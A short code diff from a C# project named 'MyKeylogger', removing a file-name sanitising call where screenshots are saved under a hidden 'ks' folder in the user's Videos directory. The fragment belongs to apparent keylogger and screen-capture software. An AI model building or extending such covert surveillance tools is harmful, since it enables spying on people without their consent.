@@ -87,7 +87,6 @@ namespace MyKeylogger
                         fname = fname.Substring(0, 10);
                     }
                     var file_name = string.Format(format1, DateTime.Now, fname);
-                    file_name = Functions.RemoveSpecialCharacters(file_name);
 
                     //Image file path
                     string file_path = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\ks\\ss-" + file_name + ".jpg";
